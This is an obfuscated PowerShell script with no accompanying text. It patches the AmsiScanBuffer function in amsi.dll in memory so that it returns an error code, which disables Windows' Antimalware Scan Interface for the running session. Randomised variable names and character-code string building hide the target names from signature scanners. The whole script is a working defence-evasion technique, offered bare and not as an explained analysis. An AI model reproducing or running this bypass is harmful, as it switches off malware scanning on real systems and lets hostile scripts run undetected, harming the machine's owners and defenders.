$cv5oGOxGQ = @"
using System;
using System.Runtime.InteropServices;
public class cv5oGOxGQ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr sbb2rU5dnxDipvPf, string zUDOl5);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr l8yim50XMmlG, UIntPtr bwKbOGao4Oaoc6, uint ozpQL, out uint _q7vKgEQ);
}
"@

Add-Type $cv5oGOxGQ

$nTy = [cv5oGOxGQ]::LoadLibrary("$([cHaR]([byTe]0x61)+[CHaR](109)+[CHAR](60+55)+[CHAr]([bytE]0x69)+[ChaR]([bYTe]0x2e)+[CHar](100+49-49)+[CHaR]([byTe]0x6c)+[chaR]([byTe]0x6c))")
$bcQ8eq0sPwoEiR5LiVMq = [cv5oGOxGQ]::GetProcAddress($nTy, "$(('ÂmsìScánBûf'+'fêr').nOrmAlIze([CHar](70+53-53)+[chaR](111)+[CHAr]([Byte]0x72)+[chAR]([byTE]0x6d)+[cHaR](51+17)) -replace [cHAr]([ByTE]0x5c)+[chAr]([byTE]0x70)+[cHar]([bYtE]0x7b)+[CHar]([BYTe]0x4d)+[CHAR](110*93/93)+[chaR](125+109-109))")
$p = 0
[cv5oGOxGQ]::VirtualProtect($bcQ8eq0sPwoEiR5LiVMq, [uint32]5, 0x40, [ref]$p)
$hvaNPQXOixcNpdo4Fhy = "0xB8"
$bYD6SVuGvvVPjrpau5 = "0x57"
$Cgy2 = "0x00"
$AZJSTzns3AtRSUh2 = "0x07"
$lvafl = "0x80"
$SjwchM9iTUyR = "0xC3"
$V5TVrR0yft = [Byte[]] ($hvaNPQXOixcNpdo4Fhy,$bYD6SVuGvvVPjrpau5,$Cgy2,$AZJSTzns3AtRSUh2,+$lvafl,+$SjwchM9iTUyR)
[System.Runtime.InteropServices.Marshal]::Copy($V5TVrR0yft, 0, $bcQ8eq0sPwoEiR5LiVMq, 6)